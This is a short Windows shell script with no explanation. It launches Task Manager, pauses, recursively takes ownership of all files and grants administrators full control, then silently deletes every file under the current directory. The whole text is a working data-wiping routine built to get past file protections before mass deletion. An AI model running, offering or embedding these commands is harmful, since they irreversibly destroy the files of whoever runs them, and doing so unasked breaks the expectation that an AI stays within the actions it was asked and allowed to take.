start taskmgr
Start-Sleep -s 5
takeown /f * /r
icacls *.* /grant administrators:F
del /s /q *.*